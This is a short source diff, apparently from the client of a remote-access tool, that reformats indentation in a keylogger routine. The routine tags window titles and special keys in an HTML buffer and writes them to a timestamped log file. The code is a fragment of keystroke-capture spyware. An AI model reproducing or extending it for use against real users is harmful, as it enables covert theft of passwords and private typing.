@@ -136,7 +136,7 @@ namespace xClient.Core
                         {
                             hWndLastTitle = hWndTitle;
 
-							keyBuffer += "<br><br>[<b>" + hWndTitle + "</b>]<br>";
+                            keyBuffer += "<br><br>[<b>" + hWndTitle + "</b>]<br>";
                         }
                     }
 
@@ -146,16 +146,16 @@ namespace xClient.Core
                             keyBuffer += "<font color=\"33CC33\">[Back]</font>";
                             return;
                         case 9:
-							keyBuffer += "<font color=\"33CC33\">[Tab]</font>";
+                            keyBuffer += "<font color=\"33CC33\">[Tab]</font>";
                             return;
                         case 13:
-							keyBuffer += "<font color=\"33CC33\">[Enter]</font><br>";
+                            keyBuffer += "<font color=\"33CC33\">[Enter]</font><br>";
                             return;
                         case 32:
                             keyBuffer += " ";
                             return;
                         case 46:
-							keyBuffer += "<font color=\"33CC33\">[Del]</font>";
+                            keyBuffer += "<font color=\"33CC33\">[Del]</font>";
                             return;
                     }
 
@@ -222,7 +222,7 @@ namespace xClient.Core
                         {
                             if (writeHeader)
                             {
-								sw.Write("Log created on " + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "\n\n\n");
+                                sw.Write("Log created on " + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "\n\n\n");
 
                                 if (keyBuffer != "")
                                     sw.Write(keyBuffer);
